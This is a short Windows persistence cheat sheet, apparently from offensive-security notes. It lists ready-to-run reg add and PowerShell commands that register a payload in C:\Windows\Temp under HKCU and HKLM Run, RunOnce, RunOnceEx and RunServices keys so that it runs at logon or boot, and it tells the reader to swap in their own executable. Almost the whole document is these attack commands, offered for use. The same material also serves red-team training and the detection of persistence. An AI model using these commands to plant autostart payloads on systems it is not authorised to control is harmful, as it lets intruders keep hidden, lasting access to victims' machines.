# Windows Persistence

### Registry Persistence&#x20;

* Just change the `example.exe or example.bat` to your executable or script or whatever you want to run
* Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.

#### HKCU

* Run Key&#x20;

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.exe"
```

* Service start during boot keys

```
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'Bank_Security' -Value 'C:\Windows\Temp\example.bat'
```

#### HKLM

* Admin privs are needed for these
* Run Key

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
```

* Service start during boot keys&#x20;

```
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v 1 /t REG_SZ /d "C:\Windows\Temp\example.bat"
```
